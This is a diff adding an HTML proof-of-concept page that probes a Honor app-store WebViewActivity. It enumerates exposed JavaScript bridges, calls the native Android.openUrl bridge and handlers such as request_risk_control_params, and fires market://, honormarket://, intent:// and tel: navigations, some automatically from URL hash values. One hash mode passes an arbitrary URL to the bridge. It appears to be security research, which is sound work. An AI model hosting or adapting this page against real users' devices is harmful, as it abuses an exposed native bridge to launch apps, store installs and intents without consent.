@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WebView JS &amp; Scheme Probe</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 12px; line-height: 1.45; }
+    h1 { font-size: 1.1rem; }
+    h2 { font-size: 1rem; margin-top: 1.2rem; }
+    pre { background: #f4f4f4; padding: 8px; overflow: auto; font-size: 12px; white-space: pre-wrap; }
+    a, button { display: block; margin: 6px 0; padding: 10px; font-size: 14px; }
+    button { width: 100%; text-align: left; }
+    .ok { color: #0a0; }
+    .warn { color: #a60; }
+    .bad { color: #c00; }
+  </style>
+</head>
+<body>
+  <h1>Honor WebViewActivity Probe</h1>
+  <p id="meta">loading…</p>
+
+  <h2>1. JS Bridge 探测</h2>
+  <pre id="bridge-out">(running…)</pre>
+  <button type="button" onclick="runBridgeProbe()">重新扫描 Bridge</button>
+
+  <h2>2. Android.openUrl JSBridge（Native 跳转）</h2>
+  <p>经 <code>WebJavaScriptInterface</code> 注入的 <code>Android</code> 对象；PoC-5 默认路径可用。</p>
+  <pre id="android-bridge-out">(checking Android…)</pre>
+  <button type="button" onclick="bridgeOpenUrl('market://details?id=com.ss.android.ugc.aweme&amp;sceneType=0204&amp;downloadType=3&amp;inner_download_type=3&amp;detailType=5')">Android.openUrl → 抖音 market://</button>
+  <button type="button" onclick="bridgeOpenUrl('market://details?id=com.android.vending')">Android.openUrl → market:// (Play)</button>
+  <button type="button" onclick="bridgeOpenUrl('honormarket://details?id=com.hihonor.id')">Android.openUrl → honormarket://</button>
+  <button type="button" onclick="bridgeOpenUrl('intent://settings/#Intent;scheme=android.settings;action=android.settings.SETTINGS;end')">Android.openUrl → intent://settings</button>
+  <p>自动模式 hash：<code>#bridge-auto-market</code>、<code>#bridge-auto-url=&lt;urlencoded&gt;</code></p>
+
+  <h2>3. 非 http(s) Scheme 跳转（location.href）</h2>
+  <p id="scheme-mode-hint">手动点击下列链接，或使用 hash 自动序列：<code>#scheme-auto</code> / <code>#scheme-auto-market</code> 等。</p>
+  <p>PoC 默认 source=8，预期：<strong>不走</strong> openUrlOnBrowser；走 WebView/super 默认行为。</p>
+  <a id="link-market" href="market://details?id=com.android.vending">market://details?id=com.android.vending</a>
+  <a id="link-intent" href="intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end">intent://scan/ (zxing)</a>
+  <a id="link-tel" href="tel:10086">tel:10086</a>
+  <a id="link-custom" href="honormarket://details?id=com.hihonor.id">honormarket://details?id=com.hihonor.id</a>
+  <button type="button" onclick="nav('market://details?id=com.android.vending')">JS → market://</button>
+  <button type="button" onclick="nav('intent://settings/#Intent;scheme=android.settings;action=android.settings.SETTINGS;end')">JS → intent://settings</button>
+
+  <h2>4. Privacy source (5/6) ACTION_VIEW 探测</h2>
+  <p>仅当 WebView 以 source=5/6 打开时，点击外链可能触发 openUrlOnBrowser → ACTION_VIEW。</p>
+  <a id="link-ext-https" href="https://example.com/poc-action-view-test">https://example.com/ (非白名单外链)</a>
+
+  <h2>5. 事件日志</h2>
+  <pre id="event-log"></pre>
+
+  <script>
+    function log(msg) {
+      var el = document.getElementById('event-log');
+      var line = new Date().toISOString().slice(11, 19) + ' ' + msg;
+      el.textContent = (el.textContent ? el.textContent + '\n' : '') + line;
+      try { console.log('[probe] ' + msg); } catch (e) {}
+    }
+
+    function nav(url) {
+      log('JS location.href = ' + url);
+      window.location.href = url;
+    }
+
+    function probeAndroidBridge() {
+      var el = document.getElementById('android-bridge-out');
+      var lines = [];
+      lines.push(describeObj('window.Android', window.Android));
+      if (typeof Android !== 'undefined' && Android !== null) {
+        var androidMethods = [];
+        try {
+          androidMethods = Object.getOwnPropertyNames(Android).filter(function (k) {
+            return typeof Android[k] === 'function';
+          });
+        } catch (e) {}
+        lines.push('Android callable methods: ' + JSON.stringify(androidMethods));
+        lines.push('openUrl present: ' + (typeof Android.openUrl === 'function'));
+      } else {
+        lines.push('Android bridge NOT visible from JS (may still exist on older WebView).');
+      }
+      el.textContent = lines.join('\n');
+      return typeof Android !== 'undefined' && typeof Android.openUrl === 'function';
+    }
+
+    function bridgeOpenUrl(url) {
+      log('Android.openUrl("", "' + url + '")');
+      if (typeof Android === 'undefined' || typeof Android.openUrl !== 'function') {
+        log('ERROR: Android.openUrl unavailable');
+        alert('Android.openUrl not available');
+        return;
+      }
+      try {
+        Android.openUrl('', url);
+        log('Android.openUrl invoked OK');
+      } catch (e) {
+        log('Android.openUrl threw: ' + e);
+      }
+    }
+
+    function describeObj(name, obj) {
+      if (typeof obj === 'undefined') return name + ': undefined';
+      if (obj === null) return name + ': null';
+      var t = typeof obj;
+      var keys = [];
+      try { keys = Object.getOwnPropertyNames(obj); } catch (e) { keys = ['(getOwnPropertyNames failed: ' + e + ')']; }
+      var methods = keys.filter(function (k) {
+        try { return typeof obj[k] === 'function'; } catch (e) { return false; }
+      });
+      return name + ': typeof=' + t + ', ownKeys=' + JSON.stringify(keys) + ', methods=' + JSON.stringify(methods);
+    }
+
+    function probeBridgeHandler(name) {
+      return new Promise(function (resolve) {
+        if (typeof WebViewJavascriptBridge === 'undefined') {
+          resolve(name + ': WebViewJavascriptBridge missing');
+          return;
+        }
+        try {
+          WebViewJavascriptBridge.callHandler(name, '{}', function (resp) {
+            resolve(name + ': callback resp=' + JSON.stringify(resp));
+          });
+          setTimeout(function () { resolve(name + ': (no callback within 2s)'); }, 2000);
+        } catch (e) {
+          resolve(name + ': callHandler error ' + e);
+        }
+      });
+    }
+
+    function runBridgeProbe() {
+      probeAndroidBridge();
+      var lines = [];
+      lines.push(describeObj('window.Android', window.Android));
+      lines.push(describeObj('window.honor_market', window.honor_market));
+      lines.push(describeObj('window.WebViewJavascriptBridge', window.WebViewJavascriptBridge));
+      lines.push(describeObj('window._WebViewJavascriptBridge', window._WebViewJavascriptBridge));
+
+      if (window.honor_market) {
+        var hmKeys = [];
+        try { hmKeys = Object.getOwnPropertyNames(window.honor_market); } catch (e) {}
+        lines.push('honor_market note: registered via addJavascriptInterface but WebViewActivity has NO @JavascriptInterface methods → JS callable methods=' + hmKeys.length);
+      } else {
+        lines.push('honor_market note: typeof honor_market is undefined — may be invisible on some WebView/UA; bridge may still exist natively.');
+      }
+
+      document.getElementById('bridge-out').textContent = lines.join('\n');
+      log('Bridge scan done');
+
+      Promise.all([
+        probeBridgeHandler('request_activities_config'),
+        probeBridgeHandler('dialog_onclick_cancel'),
+        probeBridgeHandler('request_risk_control_params')
+      ]).then(function (rs) {
+        lines.push('--- BridgeWebView handlers ---');
+        rs.forEach(function (r) { lines.push(r); });
+        document.getElementById('bridge-out').textContent = lines.join('\n');
+      });
+    }
+
+    document.querySelectorAll('a[id^="link-"]').forEach(function (a) {
+      a.addEventListener('click', function () { log('click ' + a.href); });
+    });
+
+    document.getElementById('meta').textContent =
+      'UA: ' + navigator.userAgent + '\nURL: ' + location.href;
+
+    var SCHEME_TARGETS = {
+      market: 'market://details?id=com.android.vending',
+      intent: 'intent://settings/#Intent;scheme=android.settings;action=android.settings.SETTINGS;end',
+      tel: 'tel:10086',
+      honormarket: 'honormarket://details?id=com.hihonor.id'
+    };
+
+    function scheduleSchemeNav(name, url, delayMs) {
+      setTimeout(function () {
+        log('scheme-auto[' + name + ']: navigating to ' + url);
+        window.location.href = url;
+      }, delayMs);
+    }
+
+    function runSchemeAuto(only) {
+      var order = ['market', 'intent', 'tel', 'honormarket'];
+      if (only) {
+        if (!SCHEME_TARGETS[only]) {
+          log('scheme-auto: unknown scheme ' + only);
+          return;
+        }
+        order = [only];
+      }
+      var baseDelay = 3000;
+      var step = 4500;
+      log('scheme-auto: sequence=' + order.join(',') + ' (starts in ' + (baseDelay / 1000) + 's)');
+      document.getElementById('scheme-mode-hint').textContent =
+        '自动模式: 将依次加载 ' + order.join(' → ');
+      for (var i = 0; i < order.length; i++) {
+        scheduleSchemeNav(order[i], SCHEME_TARGETS[order[i]], baseDelay + i * step);
+      }
+    }
+
+    probeAndroidBridge();
+    runBridgeProbe();
+    log('probe page loaded');
+
+    var hash = location.hash.replace(/^#/, '');
+    if (hash === 'bridge-auto-market') {
+      log('bridge-auto-market: Android.openUrl(market://) in 3s');
+      setTimeout(function () {
+        bridgeOpenUrl('market://details?id=com.android.vending');
+      }, 3000);
+    } else if (hash.indexOf('bridge-auto-url=') === 0) {
+      var autoUrl = decodeURIComponent(hash.substring('bridge-auto-url='.length));
+      log('bridge-auto-url: Android.openUrl in 3s → ' + autoUrl);
+      setTimeout(function () {
+        bridgeOpenUrl(autoUrl);
+      }, 3000);
+    } else if (hash === 'bridge-auto-honormarket') {
+      log('bridge-auto-honormarket: Android.openUrl(honormarket://) in 3s');
+      setTimeout(function () {
+        bridgeOpenUrl('honormarket://details?id=com.hihonor.id');
+      }, 3000);
+    } else if (hash === 'privacy-auto') {
+      log('privacy-auto: will navigate to external https in 3s (source 5/6 → ACTION_VIEW test)');
+      setTimeout(function () {
+        var target = 'https://example.com/poc-action-view-test';
+        log('privacy-auto: navigating to ' + target);
+        window.location.href = target;
+      }, 3000);
+    } else if (hash === 'scheme-auto') {
+      runSchemeAuto(null);
+    } else if (hash.indexOf('scheme-auto-') === 0) {
+      runSchemeAuto(hash.substring('scheme-auto-'.length));
+    }
+  </script>
+</body>
+</html>
